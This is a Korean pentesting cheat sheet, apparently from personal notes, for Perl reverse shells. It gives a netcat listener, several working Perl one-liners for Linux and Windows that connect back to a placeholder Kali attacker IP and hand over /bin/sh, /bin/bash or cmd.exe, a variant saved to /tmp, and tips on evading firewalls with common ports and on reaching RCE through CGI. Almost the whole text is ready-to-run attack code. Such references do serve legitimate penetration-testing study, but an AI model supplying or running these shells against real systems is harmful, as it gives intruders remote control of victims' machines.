# perl

# 리버스쉘 — Perl

---

## 리스너

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

---

## Linux

```bash
# 기본 (가장 보편적)
perl -e 'use Socket;$i="<칼리IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# 모듈 단축 형태
perl -MSocket -e '$i="<칼리IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")'

# fork 방식 (더 안정적)
perl -e 'use Socket;$i="<칼리IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));while(1){if(!fork){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");last}}'

# 파일로 저장
cat > /tmp/shell.pl << 'EOF'
use Socket;
$i="<칼리IP>";
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}
EOF
perl /tmp/shell.pl

# /bin/sh 없을 때
perl -e 'use Socket;$i="<칼리IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

---

## Windows

```bash
# cmd.exe 실행
perl -e "use Socket;$i='<칼리IP>';$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('cmd.exe');}"
```

---

## 버전 및 경로 확인

```bash
which perl
perl --version
ls /usr/bin/perl* 2>/dev/null
find / -name perl -type f 2>/dev/null
```

---

## 팁

- Perl은 대부분의 Linux 시스템에 기본 설치 (특히 구버전 서버)
- `use Socket` 모듈은 표준 내장 모듈이라 별도 설치 불필요
- 방화벽 우회 시 포트 443, 80, 8080 사용
- CGI 환경에서 Perl 스크립트 실행 가능하면 ShellShock 없이도 RCE 가능
- `/usr/bin/perl` 이 SUID 설정되어 있으면 GTFOBins 참고